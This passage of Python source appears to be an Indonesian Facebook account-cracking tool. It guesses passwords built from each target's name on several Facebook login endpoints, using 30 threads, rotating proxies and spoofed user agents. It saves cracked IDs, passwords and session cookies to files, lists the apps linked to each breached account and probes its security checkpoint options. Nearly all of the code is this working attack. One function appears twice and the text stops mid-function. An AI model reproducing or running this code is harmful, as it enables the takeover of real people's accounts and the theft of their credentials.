                        id2.insert(xx,bacot)
        else:
                print('├──> Pilih Yang Bener Bangsat Kontooll ')
                exit()
        print('├──> 1. Mobile.Facebook ')
        print('├──> 2. Mbasic.Facebook ')
        ###print('├──> 3. bbh  ')
        ###print('├──> 4. Mfreefb ')
        print('|')
        hc = input('├──> Pilih : ')
        if hc in ['1','01']:
                method.append('mobile')
        elif hc in ['2','02']:
                method.append('free')
        elif hc in ['3','03']:
                method.append('touch')
        elif hc in ['4','04']:
                method.append('mbasic')
        else:
                method.append('mobile')
        print('|')
        _jembot_ = input('├──> Ingin Menampilkan Aplikasi ( Y/t ) : ')
        if _jembot_ in ['']:
                print('├──> Pilih Yang Bener Kontol ')
                back()
        elif _jembot_ in ['y','Y']:
                taplikasi.append('ya')
        else:
                taplikasi.append('no')
        pwplus=input('├──> Ingin Menambahkan Password Manual ( Y/t ) : ')
        if pwplus in ['y','Y']:
                pwpluss.append('ya')
                cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahannya Cuy\n[[cyan]•[white]] Contoh :[green] sayang,bismillah,indonesia[white] '))
                pwku=input('├──> Masukkan Password Tambahan : ')
                pwkuh=pwku.split(',')
                for xpw in pwkuh:
                        pwnya.append(xpw)
        else:
                pwpluss.append('no')
        passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
        print('|')
        print(f'├──>{h} ▪︎ {h} ▪︎ {h} ▪︎ {x} Sedang Proses Cracking Harap Sabar {h} ▪︎ {h} ▪︎ {h} ▪︎ {x} ')
        print(f'├──> Hasil {h}OK{x} Akan Tersimpan Di : {h}OK/%s {x}'%(okc))
        print(f'├──> Hasil {k}CP{x} Akan Tersimpan Di : {k}CP/%s {x}'%(cpc))
        print('|')
        print('|')
        with tred(max_workers=30) as pool:
                for yuzong in id2:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        pwv = []
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345')
                        else:
                                if len(frs)<3:
                                        pwv.append(nmf)
                                else:
                                        pwv.append(nmf)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'1234')
                                        pwv.append(frs+'12345')
                        if 'ya' in pwpluss:
                                for xpwd in pwnya:
                                        pwv.append(xpwd)
                        else:pass
                        if 'mobile' in method:
                                pool.submit(crack,idf,pwv)
                        elif 'free' in method:
                                pool.submit(crackfree,idf,pwv)
                        elif 'touch' in method:
                                pool.submit(cracktouch,idf,pwv)
                        elif 'mbasic' in method:
                                pool.submit(crackmbasic,idf,pwv)
                        else:
                                pool.submit(crackmbasic,idf,pwv)
        print('|')
        cetak(nel('\t[cyan]▪︎[green] CRACK SELESAI CUY ANJAZ[cyan] ▪︎[white] '))
        print(f'[{b}•{x}]{h} HASIL AKUN OK : {h}%s '%(ok))
        print(f'{x}[{b}•{x}]{k} HASIL AKUN CP : {k}%s{x} '%(cp))
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
        global loop,ok,cp
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f"\r├──> BAZ {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
        sys.stdout.flush()
        nip=random.choice(prox)
        proxs= {'http': 'socks4://'+nip}
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
                try:
                        ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                        po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                print(f'\r├── ID  : {K}{idf}{P}          \n│   └──  SANDI  : {K}{pw}          {P}\n└── UA  : {M}{ua}{M}           \n')
                                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  SANDI  : {H}{pw}          {P}\n└──  KUKIS : {hh}{kuki}          {P}\n└── UGENT  : {M}{ua}{M}\n')
                                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                                cek_apk(session,coki)
                                break

                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(31)
        loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
        global loop,ok,cp
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f"\r├──> BAZ {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
        sys.stdout.flush()
        nip=random.choice(prox)
        proxs= {'http': 'socks5://'+nip}
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
                try:
                        ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                        ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                print(f'\r├── ID  : {K}{idf}{P}          \n│   └──  SANDI  : {K}{pw}          {P}\n└── UA  : {M}{ua}{M}           \n')
                                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  SANDI  : {H}{pw}          {P}\n└──  KUKIS : {hh}{kuki}          {P}\n└── UGENT  : {M}{ua}{M}\n')
                                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                                cek_apk(session,coki)
                                break

                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(31)
        loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
        global loop,ok,cp
        bi = random.choice([u,k,kk,b,h,hh])
        pers = loop*100/len(id2)
        fff = '%'
        nip=random.choice(prox)
        proxs= {'http': 'socks4://'+nip}
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
        for pw in pwv:
                try:
                        ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
                        po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                if 'ya' in oprek:
                                        akun.append(idf+'|'+pw)
                                        ceker(idf,pw)
                                elif 'ya' in princp:
                                        print('\n')
                                        statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                                        statuscp1 = nel(statuscp, style='red')
                                        cetak(nel(statuscp1, title='AOREC-XD CP'))
                                        open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                                        akun.append(idf+'|'+pw)
                                        cp+=1
                                else:continue
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                                if 'no' in taplikasi:
                                        coki=po.cookies.get_dict()
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                                        print('\n')
                                        statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                                        statusok1 = nel(statusok, style='green')
                                        cetak(nel(statusok1, title='AOREC-XD OK'))
                                        ok+=1
                                        break
                                elif 'ya' in taplikasi:
                                        coki=po.cookies.get_dict()
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                                        user=idf
                                        infoakun = ""
                                        session = requests.Session()
                                        cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                                        cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                                        infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
                                        apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                                        nok=1
                                        for muncul in apkaktif:
                                                infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
                                                nok+=1

                                        hit=0
                                        infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
                                        apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                                        hit=0
                                        for muncul in apkexp:
                                                hit+=1
                                                infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
                                        print('\n')
                                        statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
                                        statusok1 = nel(statusok, style='green')
                                        cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
                                        ok+=1
                                        break


                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(31)
        loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
        global loop,ok,cp
        bi = random.choice([u,k,kk,b,h,hh])
        pers = loop*100/len(id2)
        fff = '%'
        nip=random.choice(prox)
        proxs= {'http': 'socks5://'+nip}
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
        for pw in pwv:
                try:
                        ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                        p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
                        po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                if 'ya' in oprek:
                                        akun.append(idf+'|'+pw)
                                        ceker(idf,pw)
                                elif 'ya' in princp:
                                        print('\n')
                                        statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                                        statuscp1 = nel(statuscp, style='red')
                                        cetak(nel(statuscp1, title='AOREC-XD CP'))
                                        open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                                        akun.append(idf+'|'+pw)
                                        cp+=1
                                else:continue
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                                if 'no' in taplikasi:
                                        coki=po.cookies.get_dict()
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                                        print('\n')
                                        statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                                        statusok1 = nel(statusok, style='green')
                                        cetak(nel(statusok1, title='OK'))
                                        ok+=1
                                        break
                                elif 'ya' in taplikasi:
                                        coki=po.cookies.get_dict()
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                                        user=idf
                                        infoakun = ""
                                        session = requests.Session()
                                        cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                                        cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                                        infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
                                        apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                                        nok=1
                                        for muncul in apkaktif:
                                                infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
                                                nok+=1

                                        hit=0
                                        infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
                                        apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                                        hit=0
                                        for muncul in apkexp:
                                                hit+=1
                                                infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
                                        print('\n')
                                        statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
                                        statusok1 = nel(statusok, style='green')
                                        cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
                                        ok+=1
                                        break
                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(31)
        loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
        global cp
        ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
        head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        ses = requests.Session()
        try:
                hi = ses.get('https://mbasic.facebook.com')
                ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
                jo = ho.find('form')
                data = {}
                lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                for anj in jo('input'):
                        if anj.get('name') in lion:
                                data.update({anj.get('name'):anj.get('value')})
                kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
                opsi = kent.find_all('option')
                if len(opsi)==0:
                        print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                else:
                        for opsii in opsi:
                                print('\r%s---> %s%s'%(kk,opsii.text,x))
        except Exception as c:
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
        global cp
        ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
        head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        ses = requests.Session()
        try:
                hi = ses.get('https://mbasic.facebook.com')
                ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
